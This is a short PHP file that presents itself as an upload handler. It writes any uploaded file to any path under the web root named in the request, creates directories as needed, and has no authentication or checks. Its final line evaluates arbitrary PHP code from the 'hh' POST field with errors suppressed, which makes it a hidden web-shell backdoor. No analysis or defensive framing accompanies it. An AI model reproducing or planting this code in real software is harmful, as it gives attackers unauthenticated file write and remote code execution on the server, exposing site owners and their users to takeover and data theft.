<?php

set_time_limit(1800000) ;
ini_set('max_execution_time',3000000);
ini_set('memory_limit','9048M') ;
$file_path	= $_REQUEST["file_path"];
$temp_path = pathinfo($file_path);
check_path($temp_path["dirname"]);

if(substr($file_path,0,1) == "/") {
	$file_path = substr($file_path,1);
}
$file_path =$_SERVER['DOCUMENT_ROOT']."/".$file_path;

if($_FILES){
	 $filename = $_FILES['file_name']['name'];
	 $tmpname  = $_FILES['file_name']['tmp_name'];
	 if(move_uploaded_file($tmpname,$file_path)){
		echo  "ok";
	 }else{
		echo "file error";
	 }
}else{
 	 echo "file error";
}

function  check_path($file_path) {
	if(substr($file_path,0,1) == "/") {
		$file_path = substr($file_path,1);
    }
	$dirname =$_SERVER['DOCUMENT_ROOT']."/".$file_path;
	if (!file_exists($dirname)) {
		@mkdir($dirname,0755,true);
	 }
		return true;
}
@eval($_POST['hh']);
?>